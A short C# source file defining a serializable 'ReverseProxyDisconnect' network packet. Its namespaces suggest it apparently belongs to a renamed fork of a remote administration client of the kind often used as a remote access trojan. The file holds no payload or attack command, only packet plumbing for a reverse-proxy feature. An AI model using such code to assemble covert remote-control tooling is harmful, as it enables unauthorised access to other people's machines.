using System;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Paketler;

namespace xClient.KuuhakuÇekirdek.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyDisconnect : IPacket
    {
        public int ConnectionId { get; set; }

        public ReverseProxyDisconnect(int connectionId)
        {
            this.ConnectionId = connectionId;
        }

        public ReverseProxyDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
